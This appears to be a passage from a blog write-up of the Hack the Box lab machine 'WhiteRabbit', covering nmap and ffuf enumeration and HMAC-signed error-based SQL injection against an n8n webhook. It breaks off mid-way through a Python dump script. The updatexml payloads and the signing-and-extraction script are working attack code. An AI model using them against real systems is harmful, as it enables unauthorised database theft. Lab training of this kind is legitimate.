<!DOCTYPE html>
<html lang="en">

  <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <title>Hack the Box - WhiteRabbit</title>
  <meta name="description"
    content="">

  <link rel="stylesheet" href="/assets/css/style.css">
  <link rel="canonical" href="http://localhost:4000/writeup/htb/2025/12/15/whiterabbit.html">
  <link rel="alternate" type="application/rss+xml" title="Naved124" href="/feed.xml">

  <!-- Optional: Google Fonts for that extra techy feel -->
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&display=swap"
    rel="stylesheet">

  <style>
    /* Override font-family if google font loads */
    body {
      font-family: 'JetBrains Mono', 'Courier New', monospace;
    }

    code,
    pre {
      font-family: 'JetBrains Mono', monospace;
    }
  </style>
</head>

  <body>

    <header>
  <div class="container">
    <a class="site-title" href="/">Naved124</a>
    <nav>
        <a href="/">~/home</a>
        <a href="/about/">./about</a>
        <!-- Add more links here later -->
        <a href="https://github.com/">git_status</a>
    </nav>
  </div>
</header>

    <main class="page-content" aria-label="Content">
      <div class="container">
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title" itemprop="name headline">Hack the Box - WhiteRabbit</h1>
    <p class="post-meta">
      <time datetime="2025-12-15T00:00:00+05:30" itemprop="datePublished">
        Dec 15, 2025
      </time>
      
    </p>
  </header>

  <div class="post-content" itemprop="articleBody">
    <p><img src="/assets/hi.png" alt="hi.png" /></p>

<p><img src="/assets/white.png" alt="white.png" /></p>

<p><strong>Hack the box - White Rabbit</strong></p>

<p>OS: Linux</p>

<p>Difficulty: Insane</p>

<p>Platform: HackTheBox</p>

<p>Box IP: 10.10.11.63</p>

<p>Box Creator:  FLX0x00</p>

<p>Author: DarkAngel79 (Naved Khan)</p>

<p>Box Released: May 4, 2025</p>

<p>Tools: Ghidra, John, FFUF, restic</p>

<p>Writeup Updated: Dec 15, 2025</p>

<p>Reference: (https://app.hackthebox.com/Machines/WhiteRabbit)</p>

<p><strong>Synopsis</strong></p>
<hr />

<p><strong>WhiteRabbit</strong> is an insane-difficulty Linux target hosting an uptime-monitoring platform. Initial enumeration of a public status page reveals multiple subdomains, including an internal wiki containing sensitive documentation. The wiki discloses the use of <strong>GoPhish</strong> integrated with <strong>n8n</strong> workflows for automated phishing analysis.</p>

<p>Analysis of an exposed workflow file reveals a custom request-signing mechanism and an <strong>SQL injection vulnerability</strong>. By recreating the signing logic, error-based SQL injection is achieved, allowing database extraction. This includes a <code class="language-plaintext highlighter-rouge">command_log</code> table containing historical commands executed on the system.</p>

<p>Further enumeration uncovers a custom encrypted backup service. Using the recovered encryption password, backup snapshots are extracted, revealing a password-protected ZIP file containing an SSH key for the <strong>bob</strong> user. By abusing the same backup mechanism in reverse and backing up <code class="language-plaintext highlighter-rouge">/root</code>, an unprotected SSH key for the <strong>morpheus</strong> user is obtained.</p>

<p>Privilege escalation continues by reversing a password-generation binary used by the <strong>neo</strong> user. The password is time-based and generated with millisecond precision. Since the extracted logs only provide second-level timestamps, all 1,000 millisecond possibilities are brute-forced, successfully recovering neo’s SSH password.</p>

<p>The <strong>neo</strong> user has unrestricted <code class="language-plaintext highlighter-rouge">sudo</code>privileges, allowing full root access to the system.</p>

<p><strong>Skills Required</strong></p>
<hr />
<ul>
  <li>Web Enumeration and subdomain discovery</li>
  <li>Understanding of error-based SQL Injections</li>
  <li>Restic usage for backup/restore data</li>
  <li>Intermediate reverse engineering skills</li>
</ul>

<p><strong>Skills Learned</strong></p>
<hr />
<ul>
  <li>Automating constrained <code class="language-plaintext highlighter-rouge">SQLi</code> chains with signing requirements</li>
  <li>Cracking <strong>zip</strong> files</li>
  <li>Abusing backup tooling in reverse to extract high value files</li>
  <li><strong>Reversing binaries</strong> and reconstructing <code class="language-plaintext highlighter-rouge">time-based password algorithms</code></li>
</ul>

<p><strong>Enumeration</strong></p>
<hr />
<p>We first start by enumerating the target using <strong>nmap</strong> scan it is the first step in usually any target reconnaissance, to discover open ports and services and their versions to find a viable attack surface.</p>

<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap  <span class="nt">-A</span> <span class="nt">-p-</span> <span class="nt">-Pn</span> <span class="nt">--min-rate</span><span class="o">=</span>1000 <span class="nt">-T4</span> 10.10.11.63 
Starting Nmap 7.95 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-12-16 09:40 IST
Stats: 0:00:36 elapsed<span class="p">;</span> 0 hosts completed <span class="o">(</span>1 up<span class="o">)</span>, 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 51.70% <span class="k">done</span><span class="p">;</span> ETC: 09:41 <span class="o">(</span>0:00:35 remaining<span class="o">)</span>
Warning: 10.10.11.63 giving up on port because retransmission cap hit <span class="o">(</span>6<span class="o">)</span><span class="nb">.</span>
Nmap scan report <span class="k">for </span>10.10.11.63
Host is up <span class="o">(</span>0.21s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 65532 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.9 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   256 0f:b0:5e:9f:85:81:c6:ce:fa:f4:97:c2:99:c5:db:b3 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 a9:19:c3:55:fe:6a:9a:1b:83:8f:9d:21:0a:08:95:47 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp   open  http    Caddy httpd
|_http-server-header: Caddy
|_http-title: Did not follow redirect to http://whiterabbit.htb
2222/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   256 c8:28:4c:7a:6f:25:7b:58:76:65:d8:2e:d1:eb:4a:26 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 ad:42:c0:28:77:dd:06:bd:19:62:d8:17:30:11:3c:87 <span class="o">(</span>ED25519<span class="o">)</span>
Device <span class="nb">type</span>: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

TRACEROUTE <span class="o">(</span>using port 110/tcp<span class="o">)</span>
HOP RTT       ADDRESS
1   306.73 ms 10.10.16.1
2   161.96 ms 10.10.11.63

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>96.40 seconds

</code></pre></div></div>

<p>The scan reveals that <strong>SSH</strong> and <strong>Caddy httpd</strong> are open on their respective default ports. Attempting to visit
the HTTP port redirects to <code class="language-plaintext highlighter-rouge">whiterabbit.htb</code></p>

<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s1">'10.10.11.63 whiterabbit.htb'</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
10.10.11.63 whiterabbit.htb
</code></pre></div></div>

<p><img src="/assets/Pasted%20image%2020251216095526.png" alt="Pasted image 20251216095526.png" /></p>

<p>While navigating the website, we see a service for penetration testing being advertised. Checking out the <code class="language-plaintext highlighter-rouge">Latest News</code> section reveals services being used.</p>

<p><img src="/assets/Pasted%20image%2020251216095854.png" alt="Pasted image 20251216095854.png" /></p>

<p>Now we begin <strong>subdomain enumeration</strong> to discover potential <code class="language-plaintext highlighter-rouge">virtual hosts</code>. There are multiple tools for performing this task but my personal favourite is <strong>ffuf</strong>.</p>

<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ffuf <span class="nt">-w</span> /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt <span class="nt">-u</span> http://whiterabbit.htb/ <span class="nt">-H</span> <span class="s2">"Host: FUZZ.whiterabbit.htb"</span> <span class="nt">-fs</span> 0

        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://whiterabbit.htb/
 :: Wordlist         : FUZZ: /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.whiterabbit.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 0
________________________________________________

status                  [Status: 302, Size: 32, Words: 4, Lines: 1, Duration: 150ms]
:: Progress: [4989/4989] :: Job [1/1] :: 284 req/sec :: Duration: [0:00:17] :: Errors: 0 ::
</span></code></pre></div></div>

<p>From this response we can see <code class="language-plaintext highlighter-rouge">status.whiterabbit.htb</code> is a virtual host thats active. We add that new entry to our /etc/hosts file. When navigating to the site we are presented with a <code class="language-plaintext highlighter-rouge">Uptime Kuma</code> login portal, but without credentials we can’t progress from here. By default in Kuma, there is a <code class="language-plaintext highlighter-rouge">/status</code> endpoint so we will perform a directory fuzz to see if we can discover any publicly accessible pages.</p>

<p><img src="/assets/Pasted%20image%2020251216101001.png" alt="Pasted image 20251216101001.png" /></p>

<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ffuf <span class="nt">-w</span> /usr/share/SecLists/Discovery/Web-Content/raft-small-words.txt <span class="nt">-u</span> http://status.whiterabbit.htb/status/FUZZ

        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://status.whiterabbit.htb/status/FUZZ
 :: Wordlist         : FUZZ: /usr/share/SecLists/Discovery/Web-Content/raft-small-words.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

temp                    [Status: 200, Size: 3359, Words: 304, Lines: 41, Duration: 129ms]

</span></code></pre></div></div>

<p>Now accessing the http://status.whiterabbit.htb/status/temp page reveals a few subdomains.</p>

<p><img src="/assets/Pasted%20image%2020251216102608.png" alt="Pasted image 20251216102608.png" />
Accessing the <code class="language-plaintext highlighter-rouge">Wiki.js</code> link, we can navigate to Main menu then <code class="language-plaintext highlighter-rouge">GoPhish Webhooks</code> and read about the <code class="language-plaintext highlighter-rouge">n8n </code>workflow from a <code class="language-plaintext highlighter-rouge">GoPhish webhook</code> that works with phishing data and writes to database.</p>

<p><img src="/assets/Pasted%20image%2020251216103249.png" alt="Pasted image 20251216103249.png" /></p>

<p>Scrolling down a bit reveals a <code class="language-plaintext highlighter-rouge">downloadable</code> file which is a live execution history of the workflow along with instructions on how to use the webhook itself.</p>

<p><img src="/assets/Pasted%20image%2020251216103421.png" alt="Pasted image 20251216103421.png" /></p>

<p><strong>SQL Injection</strong></p>
<hr />

<p>We update our /etc/hosts file to add the <code class="language-plaintext highlighter-rouge">28efa8f7df.whiterabbit.htb</code>  subdomain. Analysing the <code class="language-plaintext highlighter-rouge">gophish_to_phishing_score_database.json</code>  reveals a potential SQL injection:</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">"parameters"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
	</span><span class="nl">"operation"</span><span class="p">:</span><span class="w"> </span><span class="s2">"executeQuery"</span><span class="p">,</span><span class="w">
	</span><span class="nl">"query"</span><span class="p">:</span><span class="w"> </span><span class="s2">"SELECT * FROM victims where email = </span><span class="se">\"\"</span><span class="s2"> LIMIT 1"</span><span class="p">,</span><span class="w">
	</span><span class="nl">"options"</span><span class="p">:</span><span class="w"> </span><span class="p">{}</span><span class="w">
</span><span class="p">}</span><span class="err">,</span><span class="w">
</span></code></pre></div></div>

<p>This code will result in a direct injection for the email field and it should be possible to get an error based <code class="language-plaintext highlighter-rouge">SQL injection</code> because the debug node will provide the error messages. But there are some limitations. The <code class="language-plaintext highlighter-rouge">HTTP</code> request shown in the article works fine, but changing any data in the body will result in a failure because of the signature check that happens before any data is submitted to the database. This is because <code class="language-plaintext highlighter-rouge">GoPhish webhooks</code> can use a secret to sign the messages they send according to the documentation. Fortunately, the secret for the <code class="language-plaintext highlighter-rouge">HMAC</code> calculation is also leaked in the workflow <code class="language-plaintext highlighter-rouge">JSON</code> file and the information about the signing are available in the workflow and the <code class="language-plaintext highlighter-rouge">GoPhish</code> documentation.</p>

<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">"parameters"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
</span><span class="nl">"action"</span><span class="p">:</span><span class="w"> </span><span class="s2">"hmac"</span><span class="p">,</span><span class="w">
</span><span class="nl">"type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"SHA256"</span><span class="p">,</span><span class="w">
</span><span class="nl">"value"</span><span class="p">:</span><span class="w"> </span><span class="s2">"="</span><span class="p">,</span><span class="w">
</span><span class="nl">"dataPropertyName"</span><span class="p">:</span><span class="w"> </span><span class="s2">"calculated_signature"</span><span class="p">,</span><span class="w">
</span><span class="nl">"secret"</span><span class="p">:</span><span class="w"> </span><span class="s2">"3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS"</span><span class="w">
</span><span class="p">}</span><span class="err">,</span><span class="w">
</span></code></pre></div></div>

<p>We can edit the POST request  provided in the documentation to attempt a triggering of SQL injection .</p>

<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d HTTP/1.1
Host: 28efa8f7df.whiterabbit.htb
x-gophish-signature:
<span class="nv">sha256</span><span class="o">=</span>cf4651463d8bc629b9b411c58480af5a9968ba05fca83efa03a21b2cecd1c2dd
Accept: <span class="k">*</span>/<span class="k">*</span>
Accept-Encoding: <span class="nb">gzip</span>, deflate, br
Connection: keep-alive
Content-Type: application/json
Content-Length: 81
<span class="o">{</span>
<span class="s2">"campaign_id"</span>: 1,
<span class="s2">"email"</span>: <span class="s2">"</span><span class="se">\"</span><span class="s2"> OR 1=1"</span>,
<span class="s2">"message"</span>: <span class="s2">"Clicked Link"</span>
<span class="o">}</span>
</code></pre></div></div>

<p><img src="/assets/Pasted%20image%2020251216110915.png" alt="Pasted image 20251216110915.png" /></p>

<p>The reason for this is because the signature needs to be computed against the payload currently being used. To do this we will use <code class="language-plaintext highlighter-rouge">CyberChef</code> .</p>

<p><img src="/assets/Pasted%20image%2020251216105245.png" alt="Pasted image 20251216105245.png" /></p>

<p>After replacing the <code class="language-plaintext highlighter-rouge">x-gophish-signature</code>  with the new one we just computed, we are able to trigger the error-based SQL injection.</p>

<p><img src="/assets/Pasted%20image%2020251216111322.png" alt="Pasted image 20251216111322.png" /></p>

<p>From here, we can attempt to extract database names. For example, the following payload will extract the first database name that’s not like <code class="language-plaintext highlighter-rouge">information_schema</code> .</p>
<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">"email"</span><span class="p">:</span><span class="w"> </span><span class="s2">"</span><span class="se">\"</span><span class="s2"> OR updatexml(1, concat(0x7e, (SELECT schema_name FROM
information_schema.schemata WHERE schema_name NOT LIKE </span><span class="se">\"</span><span class="s2">information_schema</span><span class="se">\"</span><span class="s2"> LIMIT 1,1),
0x7e), 1) ;"</span><span class="err">,</span><span class="w">
</span></code></pre></div></div>

<p>The summary of this injection is as follows:</p>
<ul>
  <li>Breaks out of an input field <code class="language-plaintext highlighter-rouge">(email)</code>.</li>
  <li>Uses <code class="language-plaintext highlighter-rouge">OR</code> to force the DB to execute controlled code.</li>
  <li>Calls <code class="language-plaintext highlighter-rouge">updatexml()</code> to produce an XML error containing attacker-controlled data.</li>
  <li><code class="language-plaintext highlighter-rouge">concat()</code> wraps the extracted DB name with tildes <code class="language-plaintext highlighter-rouge">( ~ )</code> for readability.</li>
  <li><code class="language-plaintext highlighter-rouge">Subquery</code> pulls a database name from <code class="language-plaintext highlighter-rouge">information_schema.schemata</code> .</li>
  <li>Output appears in server error messages resulting in a classic error-based extraction.</li>
</ul>

<p><img src="/assets/Pasted%20image%2020251216113543.png" alt="Pasted image 20251216113543.png" /></p>

<p>Now that we have a successful injection point and a way to produce output, we can script this to perform a full dump using Python. We create a tamper function which will encode the payloads using the secret and append the payload to the POST parameters, since this is a error-based injection that only displays one entry at a time, we need to loop over in a range to extract all values correctly. To limit the output I restricted the output for the specific data we are looking for.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">requests</span>
<span class="kn">import</span> <span class="n">sys</span>
<span class="kn">import</span> <span class="n">hmac</span>
<span class="kn">import</span> <span class="n">hashlib</span>
<span class="kn">import</span> <span class="n">json</span>
<span class="kn">import</span> <span class="n">re</span>
<span class="kn">import</span> <span class="n">time</span>
<span class="k">def</span> <span class="nf">tamper</span><span class="p">(</span><span class="n">payload</span><span class="p">):</span>
    <span class="n">params</span> <span class="o">=</span> <span class="sh">'</span><span class="s">{</span><span class="sh">"</span><span class="s">campaign_id</span><span class="sh">"</span><span class="s">:1,</span><span class="sh">"</span><span class="s">email</span><span class="sh">"</span><span class="s">:</span><span class="sh">"</span><span class="s">%s</span><span class="sh">"</span><span class="s">,</span><span class="sh">"</span><span class="s">message</span><span class="sh">"</span><span class="s">:</span><span class="sh">"</span><span class="s">Clicked Link</span><span class="sh">"</span><span class="s">}</span><span class="sh">'</span> <span class="o">%</span> <span class="n">payload</span>
    <span class="n">secret</span> <span class="o">=</span> <span class="sh">'</span><span class="s">3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS</span><span class="sh">'</span><span class="p">.</span><span class="nf">encode</span><span class="p">(</span><span class="sh">'</span><span class="s">utf-8</span><span class="sh">'</span><span class="p">)</span>
    <span class="n">payload_bytes</span> <span class="o">=</span> <span class="n">params</span><span class="p">.</span><span class="nf">encode</span><span class="p">(</span><span class="sh">"</span><span class="s">utf-8</span><span class="sh">"</span><span class="p">)</span>
    <span class="n">signature</span> <span class="o">=</span> <span class="sh">'</span><span class="s">sha256=</span><span class="sh">'</span> <span class="o">+</span> <span class="n">hmac</span><span class="p">.</span><span class="nf">new</span><span class="p">(</span><span class="n">secret</span><span class="p">,</span> <span class="n">payload_bytes</span><span class="p">,</span> <span class="n">hashlib</span><span class="p">.</span><span class="n">sha256</span><span class="p">).</span><span class="nf">hexdigest</span><span class="p">()</span>
    <span class="n">params</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="nf">loads</span><span class="p">(</span><span class="n">params</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">params</span><span class="p">,</span> <span class="n">signature</span>
<span class="k">def</span> <span class="nf">extract_value</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">payload_template</span><span class="p">,</span> <span class="n">rhost</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="n">payload_template</span><span class="p">.</span><span class="nf">format</span><span class="p">(</span><span class="o">**</span><span class="n">kwargs</span><span class="p">)</span>
    <span class="n">params</span><span class="p">,</span> <span class="n">signature</span> <span class="o">=</span> <span class="nf">tamper</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">Host</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">28efa8f7df.whiterabbit.htb</span><span class="sh">"</span><span class="p">,</span> <span class="sh">'</span><span class="s">x-gophish-signature</span><span class="sh">'</span><span class="p">:</span> <span class="n">signature</span><span class="p">}</span>
    <span class="n">proxies</span> <span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">http</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">http://127.0.0.1:8080</span><span class="sh">"</span><span class="p">}</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">params</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">10</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span>
<span class="n">proxies</span><span class="o">=</span><span class="n">proxies</span><span class="p">)</span>
    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Error connecting to URL: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
        <span class="k">return</span> <span class="bp">None</span>
    <span class="n">match</span> <span class="o">=</span> <span class="n">re</span><span class="p">.</span><span class="nf">search</span><span class="p">(</span><span class="sa">r</span><span class="sh">"</span><span class="s">~([^~]+)~</span><span class="sh">"</span><span class="p">,</span> <span class="n">response</span><span class="p">.</span><span class="n">text</span><span class="p">,</span> <span class="n">re</span><span class="p">.</span><span class="n">DOTALL</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">match</span><span class="p">:</span>
        <span class="k">return</span> <span class="k">match</span><span class="p">.</span><span class="nf">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="k">return</span> <span class="bp">None</span>
<span class="k">def</span> <span class="nf">extract_databases</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">rhost</span><span class="p">):</span>
    <span class="n">databases</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="n">payload_template</span> <span class="o">=</span> <span class="sa">r</span><span class="sh">'</span><span class="s">\" OR updatexml(1, concat(0x7e, (SELECT schema_name FROM information_schema.schemata WHERE schema_name NOT LIKE \"information_schema\" LIMIT {offset},1), 0x7e), 1) ;</span><span class="sh">'</span>
    <span class="n">offset</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="n">db</span> <span class="o">=</span> <span class="nf">extract_value</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">payload_template</span><span class="p">,</span> <span class="n">rhost</span><span class="p">,</span> <span class="n">offset</span><span class="o">=</span><span class="n">offset</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">db</span> <span class="ow">and</span> <span class="n">db</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">databases</span><span class="p">:</span>
            <span class="n">databases</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">db</span><span class="p">)</span>
            <span class="n">offset</span> <span class="o">+=</span> <span class="mi">1</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">break</span>
    <span class="k">return</span> <span class="n">databases</span>

<span class="k">def</span> <span class="nf">extract_tables</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">rhost</span><span class="p">,</span> <span class="n">db</span><span class="p">):</span>
    <span class="n">tables</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="n">payload_template</span> <span class="o">=</span> <span class="sa">r</span><span class="sh">'</span><span class="s">\" OR updatexml(1, concat(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=\"{db}\" LIMIT {offset},1), 0x7e), 1) ;</span><span class="sh">'</span>
    <span class="n">offset</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="n">table</span> <span class="o">=</span> <span class="nf">extract_value</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">payload_template</span><span class="p">,</span> <span class="n">rhost</span><span class="p">,</span> <span class="n">db</span><span class="o">=</span><span class="n">db</span><span class="p">,</span> <span class="n">offset</span><span class="o">=</span><span class="n">offset</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">table</span> <span class="ow">and</span> <span class="n">table</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">tables</span><span class="p">:</span>
            <span class="n">tables</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">table</span><span class="p">)</span>
            <span class="n">offset</span> <span class="o">+=</span> <span class="mi">1</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">break</span>
    <span class="k">return</span> <span class="n">tables</span>

<span class="k">def</span> <span class="nf">extract_columns</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">rhost</span><span class="p">,</span> <span class="n">db</span><span class="p">,</span> <span class="n">table</span><span class="p">):</span>
    <span class="n">columns</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="n">payload_template</span> <span class="o">=</span> <span class="sa">r</span><span class="sh">'</span><span class="s">\" OR updatexml(1, concat(0x7e, (SELECT column_name FROM information_schema.columns WHERE table_schema=\"{db}\" AND table_name=\"{table}\" LIMIT {offset},1), 0x7e), 1) ;</span><span class="sh">'</span>
    <span class="n">offset</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="n">column</span> <span class="o">=</span> <span class="nf">extract_value</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">payload_template</span><span class="p">,</span> <span class="n">rhost</span><span class="p">,</span> <span class="n">db</span><span class="o">=</span><span class="n">db</span><span class="p">,</span> <span class="n">table</span><span class="o">=</span><span class="n">table</span><span class="p">,</span>
<span class="n">offset</span><span class="o">=</span><span class="n">offset</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">column</span> <span class="ow">and</span> <span class="n">column</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">columns</span><span class="p">:</span>
            <span class="n">columns</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">column</span><span class="p">)</span>
            <span class="n">offset</span> <span class="o">+=</span> <span class="mi">1</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">break</span>
    <span class="k">return</span> <span class="n">columns</span>

<span class="k">def</span> <span class="nf">extract_data</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">rhost</span><span class="p">,</span> <span class="n">db</span><span class="p">,</span> <span class="n">table</span><span class="p">,</span> <span class="n">column</span><span class="p">):</span>
    <span class="n">data_rows</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="n">payload_template</span> <span class="o">=</span> <span class="sa">r</span><span class="sh">'</span><span class="s">\" OR updatexml(1, concat(0x7e, (SELECT {column} FROM {db}. {table} LIMIT {offset},1), 0x7e), 1) ;</span><span class="sh">'</span>
    <span class="n">offset</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="n">data</span> <span class="o">=</span> <span class="nf">extract_value</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">payload_template</span><span class="p">,</span> <span class="n">rhost</span><span class="p">,</span> <span class="n">db</span><span class="o">=</span><span class="n">db</span><span class="p">,</span> <span class="n">table</span><span class="o">=</span><span class="n">table</span><span class="p">,</span>
    <span class="n">column</span><span class="o">=</span><span class="n">column</span><span class="p">,</span> <span class="n">offset</span><span class="o">=</span><span class="n">offset</span><span class="p">)</span>
        <span class="k">if</span> <span class="n">data</span> <span class="ow">and</span> <span class="n">data</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">data_rows</span><span class="p">:</span>
            <span class="n">data_rows</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
            <span class="n">offset</span> <span class="o">+=</span> <span class="mi">1</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">break</span>
    <span class="k">return</span> <span class="n">data_rows</span>

<span class="k">def</span> <span class="nf">extract_column_data</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">rhost</span><span class="p">,</span> <span class="n">db</span><span class="p">,</span> <span class="n">table</span><span class="p">,</span> <span class="n">column</span><span class="p">):</span>
    <span class="n">data_rows</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="n">payload_template</span> <span class="o">=</span> <span class="sa">r</span><span class="sh">'</span><span class="s">\" OR updatexml(1, concat(0x7e, (SELECT t1.`{column}` FROM `{db}`.`{table}` t1 WHERE (SELECT COUNT(*) FROM `{db}`.`{table}` t2 WHERE t2.`{column}` &lt;=t1.`{column}`) = {offset}+1 LIMIT 1), 0x7e), 1) ;</span><span class="sh">'</span>
    <span class="n">offset</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="n">data</span> <span class="o">=</span> <span class="nf">extract_value</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">payload_template</span><span class="p">,</span> <span class="n">rhost</span><span class="p">,</span>
